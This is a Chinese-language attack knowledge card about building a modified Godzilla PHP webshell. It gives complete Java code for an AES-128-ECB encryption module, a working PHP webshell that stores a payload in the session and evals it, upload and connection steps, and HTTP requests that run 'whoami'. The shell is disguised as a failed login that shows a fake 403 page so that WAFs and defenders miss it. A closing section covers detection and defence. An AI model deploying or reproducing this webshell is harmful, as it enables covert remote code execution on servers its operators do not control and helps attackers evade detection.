---
id: web-php-rce-godzilla-aes-session-webshell-disguise
title: 哥斯拉 PHP 魔改 WebShell：一阶段 payload 入 session + AES-128-ECB Base64 + username/password 伪装
type: scenario
domain: web
path: web/php/rce
technique: godzilla-php-aes-session-webshell
aliases:
- 哥斯拉 PHP 加密马
- Godzilla AES WebShell
- PHP_AES_BASE64
- 一阶段 payload 写 session
- username password 伪装 webshell
- 403 假页面 webshell
tags:
- php
- webshell
- godzilla
- aes
- traffic-encryption
- session
- evasion
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:10:39+08:00'
  notes: 已通读原文并逐张核对21张图：两阶段流程（首包55635字节含stage-1 payload写入session，第二包73字节test返回ok）、CyberChef 验证 md5('key')[:16]=3c6e0b8a9c15224a 与 system('whoami'); 密文 Me1hDF8... 均与图12一致；图17 错误用户名返回403假页，图18 连接Success。原文无受影响版本/CVE。frontmatter 无 sources/source_url；PoC 未在本机复跑。
---

## 一句话结论

哥斯拉（Godzilla）的 PHP 马可以通过自定义 `Cryption` 加密模块改造成 AES-128-ECB + Base64 的加密 WebShell：第一次请求把包含 `getBasicsInfo` 的完整 stage-1 payload 解密后存入 `$_SESSION`，后续请求只解密会话里的 payload 并 `eval`，再调用其中的 `run($data)` 执行模块指令；请求体伪装成普通登录表单 `username=eviden&password=<Base64 密文>`，用户名不匹配时返回 403 假页面。这样流量里没有明文 PHP/命令，静态文件也不含显式 `eval($_POST[...])`。

## 原理

- **哥斯拉连接流程**：
  - 客户端 `ShellEntity.initShellOpertion()` 组装 `payload`（原始大马数据）与 `cryption`（加密模块），调用 `cryptionModel.init(this)`；`init` 中把 payload 经加密模块编码后发送。
  - 服务端解密并执行 payload，将其写入 `session` 完成持久化；之后客户端只发模块名和参数，服务端从 session 取出 payload 执行，再调用 payload 内的 `run()` 处理本次请求。
  - 连接测试调用 `test()`，等价于 `evalFunc(null, "test", ...)`，服务端返回 `ok` 即连接成功。因此第一次包很大（含完整 payload），第二次包很小（只含 `test` 模块）。
- **Cryption 模块**：`@CryptionAnnotation(Name="PHP_AES_BASE64", payloadName="PhpDynamicPayload")` 注册一个加密器，实现 `init/encode/decode/isSendRLData/generate/check`。`generate` 负责在客户端点击“生成”时把模板文件里的 `{user}`/`{pass}`/`{key}` 替换为实际值。
- **密钥派生**：`key = substr(md5($rawKey), 0, 16)`，取 MD5 十六进制串前 16 个字符作为 AES-128 密钥的 ASCII 字节；客户端 Godzilla 的 `SecretKeyX` 也是同样的 `md5(rawKey)[:16]`，两端一致。`Cipher.getInstance("AES")` 默认 `AES/ECB/PKCS5Padding`，与 PHP `openssl_encrypt(..., 'AES-128-ECB', $key, OPENSSL_RAW_DATA)` 的 PKCS7 填充兼容。
- **加密与编码**：客户端 `Base64(AES_ECB(data))`，再做 `URLEncoder.encode` 放入表单；PHP 对 `application/x-www-form-urlencoded` 请求体自动做一次 URL 解码，因此服务端**不能再 `urldecode`**，否则 `+` 等字符被二次解码，Base64 数据损坏、AES 解密失败（原文实测的坑）。
- **请求伪装**：
  - 服务端固定参数 `username` 必须严格等于 `$user`；否则 `show_error()` 返回 HTTP 403 + 假 `403 Forbidden` 页面，扫描器/蓝队看到的是普通拒绝。
  - 真正的密文放在 `password` 参数里，整个请求看起来像一次失败的登录；`session_start()` 让同一 Cookie 的后续请求复用会话。
- **两阶段逻辑**：
  1. 首次请求：解密 `password` 得到 stage-1 payload；若 payload 中含 `getBasicsInfo`，把它 AES 加密后写入 `$_SESSION['payload']`（不执行）。
  2. 后续请求：从 session 取出密文解密、`eval($payload)` 定义 `run()`，再 `echo aes_encrypt(@run($data), $key)` 执行本次模块调用并加密回显。
  这样大马代码只在客户端发送一次，后续流量只剩模块指令的密文。
- **为什么能规避检测**：静态文件里没有 `eval($_POST[...])` 的直连结构（只有 `$pass` 变量和 session 读取，需运行时看行为）；网络层请求体是 Base64 密文，没有命令关键字；参数名与普通登录一致；错误用户名返回 403 而不是 200/500，降低被主动扫描识别的概率。

## 触发条件

- 目标 PHP 环境可执行上传/写入的 PHP 文件，且启用 `session`、`openssl` 扩展（AES-128-ECB 可用）。
- 攻击者能使用或魔改哥斯拉客户端（Java），能编译/加载自定义 `Cryption` 模块（或直接手工构造密文）。
- WebShell 文件可访问，且 PHP 未禁用 `eval`、`session_start`、`openssl_*`。
- 目标没有针对 session 内容/RASP 的强检测；WAF 主要依赖明文特征时，本方案可绕过。
- 攻击者知道/能设置 `user`、`pass` 参数名与密钥（生成时写入马内）。

## 利用步骤

1. 在哥斯拉源码 `shells/cryptions/phpXor/` 下新建 `MyPHPShell.java`，加注解并实现 `Cryption`：
   ```java
   @CryptionAnnotation(Name="PHP_AES_BASE64", payloadName="PhpDynamicPayload")
   public class MyPHPShell implements Cryption {
       private ShellEntity shell; private Http http;
       private Cipher encodeCipher, decodeCipher;
       private String key, pass; private byte[] payload; private boolean state;

       public void init(ShellEntity context) {
           this.shell = context; this.http = shell.getHttp();
           this.key = shell.getSecretKeyX();   // md5(rawKey)[:16]
           this.pass = shell.getPassword();
           try {
               encodeCipher = Cipher.getInstance("AES");
               decodeCipher = Cipher.getInstance("AES");
               encodeCipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key.getBytes(), "AES"));
               decodeCipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key.getBytes(), "AES"));
               payload = shell.getPayloadModule().getPayload();
               if (payload != null) { http.sendHttpResponse(payload); state = true; }
           } catch (Exception e) { Log.error(e); }
       }

       public byte[] encode(byte[] data) {
           try {
               String b64 = java.util.Base64.getEncoder().encodeToString(encodeCipher.doFinal(data));
               return ("username=" + pass + "&password=" + URLEncoder.encode(b64)).getBytes();
           } catch (Exception e) { return null; }
       }

       public byte[] decode(byte[] data) {
           try { return decodeCipher.doFinal(functions.base64Decode(new String(data))); }
           catch (Exception e) { return null; }
       }

       public boolean isSendRLData() { return true; }
       public boolean check() { return state; }
       public byte[] generate(String password, String secretKey) {
           return Generate.GenerateMyPHPShell(password, "password", secretKey);
       }
   }
   ```
2. 在 `Generate` 中新增模板生成方法：读取 `myShellPHP.bin`，替换 `{user}`/`{pass}`/`{key}`，再输出。
3. 新建服务端模板（关键逻辑）：
   ```php
   <?php
   @session_start(); @set_time_limit(0); @error_reporting(0);
   function aes_encrypt($data, $key) {
       $key = substr(md5($key), 0, 16);
       return base64_encode(openssl_encrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA));
   }
   function aes_decrypt($data, $key) {
       $key = substr(md5($key), 0, 16);
       return openssl_decrypt(base64_decode($data), 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
   }
   $user='eviden'; $pass='password'; $key='key'; $payloadName='payload';
   if (isset($_POST[$pass]) && $_POST["username"] === $user) {
       $data = aes_decrypt($_POST[$pass], $key);
       if (isset($_SESSION[$payloadName])) {
           $payload = aes_decrypt($_SESSION[$payloadName], $key);
           @eval($payload);
           echo aes_encrypt(@run($data), $key);
       } else {
           if (strpos($data, "getBasicsInfo") !== false) {
               $_SESSION[$payloadName] = aes_encrypt($data, $key);
           } else { show_error(); }
       }
   } else { show_error(); }
   function show_error() {
       http_response_code(403);
       echo "<h1>403 Forbidden</h1><p>Access Denied</p>";
   }
   ```
4. 启动魔改哥斯拉，选择 `PHP_AES_BASE64` 加密器、`PhpDynamicPayload` 载荷，填入 user（如 `eviden`）与 key（如 `key`），生成 PHP 马并上传。
5. 连接时客户端先发大包（stage-1，包含 `getBasicsInfo`），服务端写入 session；再发 `test` 模块，服务端返回 `ok`，连接成功。
6. 之后所有命令都在加密的 `password` 参数中传输；例如 `system('whoami');` 经 AES-ECB+Base64 后作为 `password` 发送。

## PoC

密钥一致性验证（原文用 CyberChef 类工具）：`md5("key")[:16] = 3c6e0b8a9c15224a`，AES-128-ECB 加密 `system('whoami');` 后 Base64，得到类似：

```text
Me1hDF8mvaRxwpTOARl701o9qbXcyKWk0A79oScKpoo=
```

把密文放入请求：

```http
POST /webshell/god3.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session>

username=eviden&password=Me1hDF8mvaRxwpTOARl701o9qbXcyKWk0A79oScKpoo%3D
```

首次大包（stage-1）请求体约 55 KB，响应无回显；第二个 `test` 包只有几十字节，响应为 Base64 的 `ok`：

```http
POST /webshell/god3.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session>

username=eviden&password=p6GI9sBq6HLwY1aVVIOiUFskJPnnu7GDjg4R3RI5%2Fes%3D
```

错误用户名：

```http
username=who&password=...
```

返回：

```http
HTTP/1.1 403 Forbidden

<h1>403 Forbidden</h1><p>Access Denied</p>
```

说明：原文在本地 `PHP 7.3.4 + Apache` 环境实测，连接成功并执行 `whoami`；PoC 未在本机复跑。

## 变体与关联

- **加密算法变体**：把 AES-ECB 换成 AES-CBC（需 IV）、RSA、XOR 等；关键是客户端 `Cryption` 与服务端模板的编码/填充/密钥派生完全一致。
- **参数伪装变体**：使用任意 `username`/`password` 之外的表单字段名；错误分支可返回 404、空页面或正常首页，进一步降低可疑度。
- **会话持久化变体**：不写 `$_SESSION`，改为写临时文件/缓存/数据库；或每次请求携带完整 payload（流量更大但无状态）。
- **与 RSA 编码器卡的差异**：`web-php-rce-webshell-rsa-traffic-encoder` 用 RSA 公私钥对做流量加密，且服务端直接 `system` 执行；本卡是 Godzilla 的 session 两阶段协议 + 对称 AES + 登录表单伪装，更贴近哥斯拉生态。
- **检测关联**：哥斯拉默认 PHP_AES 使用 `md5(pass+key)` 派生左右脏数据；本魔改去掉了左右脏数据，只保留 AES-ECB + Base64，检测规则不能只匹配默认 Godzilla 特征。
- **内存马关联**：同样的一阶段 payload/session 思路可用于 JSP/Java 内存马，只是持久化介质从 session 变成 ServletContext/Filter 链。

## 检测与防御

- 检测请求特征：`application/x-www-form-urlencoded` 的 `username`/`password` 组合中 `password` 是长 Base64、同一 session 先大包后小包、响应体为短 Base64（如 `ok` 的密文）、错误用户名返回 403。
- 检测服务端行为：PHP session 文件中出现高熵 Base64、`eval` 执行 session 内容、`openssl_decrypt` 后紧接 `eval`、`run()` 动态调用；RASP/EDR 监控 `eval`、`assert`、`preg_replace /e`、`create_function` 等。
- 文件检测：不要只按 `eval($_POST` 特征扫描；检查 `session_start`+`openssl_decrypt`+`eval` 组合、变量函数调用、403 伪造页面、`getBasicsInfo`/`run` 等 Godzilla 载荷标记。
- 防御：禁用不必要的 `eval`/`assert` 与危险函数（disable_functions），限制上传目录执行 PHP，开启 open_basedir；对 session 内容做完整性/异常检测。
- 流量侧：TLS 解密后对高熵表单参数做熵值/长度异常检测；结合威胁情报匹配 Godzilla/冰蝎/蚁剑家族特征，而不是仅关键字。
